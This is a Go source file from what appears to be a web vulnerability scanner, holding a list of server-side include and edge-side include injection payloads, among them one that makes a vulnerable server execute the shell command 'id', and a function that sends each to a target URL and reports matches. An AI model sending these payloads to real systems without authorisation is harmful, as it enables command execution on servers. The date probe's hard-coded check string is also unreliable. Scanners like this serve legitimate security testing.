package vulns

import (
	"fmt"
	"io"
	"net/http"
	"strings"

	"github.com/yupiyy/bhyakugan/internal/core"
)

type SSIPayload struct {
	Name    string
	Payload string
	Check   string
}

var SSIPayloads = []SSIPayload{
	{"SSI Echo (Date)", "?ssi=<!--#echo var=\"DATE_LOCAL\" -->", "Feb 01 2026"}, 
	{"SSI Exec (ID)", "?ssi=<!--#exec cmd=\"id\" -->", "uid="},
	{"SSI PrintEnv", "?ssi=<!--#printenv -->", "DOCUMENT_ROOT"},
	{"ESI Debug", "?ssi=<esi:debug/>", "ESI Debug"},
}

// ScanSSI tests for SSI and ESI Injection
func ScanSSI(baseURL string, client *http.Client, onFound func(core.Finding)) {
	if baseURL[len(baseURL)-1] != '/' {
		baseURL += "/"
	}

	for _, p := range SSIPayloads {
		target := baseURL + p.Payload
		
		resp, err := client.Get(target)
		if err != nil {
			continue
		}
		defer resp.Body.Close()

		body, _ := io.ReadAll(resp.Body)
		bodyStr := string(body)

		if strings.Contains(bodyStr, p.Check) {
			fmt.Printf("[!] POSITIVE MATCH: %s at %s\n", p.Name, target)
			onFound(core.Finding{
				Type:     "SSI/ESI Injection",
				Target:   target,
				Detail:   fmt.Sprintf("%s detected. Found: %s", p.Name, p.Check),
				Severity: "Critical",
			})
		}
	}
}
